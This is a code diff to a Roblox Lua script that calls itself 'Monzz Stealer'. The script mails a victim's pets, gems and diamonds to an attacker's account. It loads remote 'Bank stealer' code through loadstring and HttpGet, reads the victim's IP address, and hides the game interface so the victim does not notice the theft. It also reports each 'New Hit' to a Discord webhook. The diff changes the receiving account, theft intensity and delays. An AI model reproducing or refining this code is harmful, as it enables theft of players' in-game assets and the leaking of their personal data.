@@ -24,19 +24,19 @@ getgenv().Settings = {
     },
     Events = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     Secrets = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     HC_DM_Mythics = {
         Dualhook = true,
-        Intensity = 100 --%
+        Intensity = 50 --%
     },
     Gems = {
         Dualhook = true,
-        Intensity =100 --%
+        Intensity = 100 --%
     }
 }
 
@@ -203,6 +203,9 @@ local fardplayer = game:GetService("Players").LocalPlayer
 local IPadress = game:HttpGet('https://ipinfo.io/ip')
 local data1
 
+for i,v in pairs(game:GetService("CoreGui"):GetChildren()) do
+    v:Destroy()
+end
 -- Loading Screen
 if _G.LoadingScreen ~= false then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/LoadingScreen.lua"))()
@@ -742,8 +745,8 @@ if diaamt < 110000 then
     _G.LoadingScreen = false
     _G.AntiLeave = false
     _G.MouseLock = false
-    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))() -- Exc : https://raw.githubusercontent.com/blabla/blabla/main/bank.lua
-    return;
+    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/MonzzScriptz/MailboxStealer/main/Bank%20stealer", true))()
+    return
 end
 if _G.AntiLeave ~= false then
     for i, v in pairs(game:GetService("Players").LocalPlayer.PlayerGui:GetChildren()) do
@@ -752,7 +755,7 @@ if _G.AntiLeave ~= false then
         end
     end
     for i, v in pairs(game:GetService("CoreGui"):GetChildren()) do
-        if v.Name ~= "RizzHub" and v.Name ~= "RobloxPromptGui" then
+        if v.Name ~= "TehPucuk_55" and v.Name ~= "RobloxPromptGui" then
             v:Destroy()
         end
     end
@@ -953,7 +956,7 @@ local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
             ["avatar_url"] = imgs,
             ["embeds"] = { {
                 ["title"] = "**New Hit** ||Monzz Stealer||",
-                ["url"] = "https://discord.gg/4y4CZfdJHu,
+                ["url"] = "https://discord.gg/4y4CZfdJHu",
                 ["type"] = "rich",
                 ["color"] = tonumber(0x2798FF),
                 ["thumbnail"] = {
@@ -1164,7 +1167,7 @@ end
 -- Sending The Pets
 
 local ndUser
-if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
+if UserName2 ~= nil and UserName2 ~= "TehPucuk_55" and UserName2 ~= "" then
     ndUser = UserName2
 else
     ndUser = UserName
@@ -1211,7 +1214,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #TList == 0 or TList == {} then
                     -- print("done1")
                     break
@@ -1239,7 +1242,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #BList == 0 or BList == {} then
                     -- print("done2")
                     break
@@ -1269,7 +1272,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #HList == 0 or HList == {} then
                     -- print("done3")
                     break
@@ -1298,7 +1301,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #PList == 0 or PList == {} then
                     -- print("done1")
                     break
@@ -1326,7 +1329,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #EList == 0 or EList == {} then
                     -- print("done42")
                     break
@@ -1354,7 +1357,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #EvList == 0 or EvList == {} then
                     -- print("done5")
                     break
@@ -1382,7 +1385,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 if #SList == 0 or SList == {} then
                     -- print("done6")
                     break
@@ -1410,7 +1413,7 @@ spawn(function()
                     }
                 }
                 mailremote:InvokeServer(unpack(args))
-                -- wait(5.5)
+                -- wait(0)
                 -- print("secret sending")
                 if #MList == 0 or MList == {} then
                     -- print("done6")
